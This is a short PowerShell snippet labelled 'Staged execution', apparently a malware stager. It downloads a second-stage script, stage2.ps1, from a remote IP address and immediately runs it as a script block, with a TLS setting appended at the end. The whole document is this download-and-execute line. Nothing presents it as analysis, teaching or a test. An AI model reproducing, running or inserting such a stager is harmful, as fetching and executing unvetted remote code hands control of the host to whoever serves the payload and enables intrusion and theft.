
<# Staged execution #> $TransferUrl = 'http://203.0.113.11/stage2.ps1'; $ScriptText = (New-Object Net.WebClient).DownloadString($TransferUrl); & ([ScriptBlock]::Create($ScriptText)); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
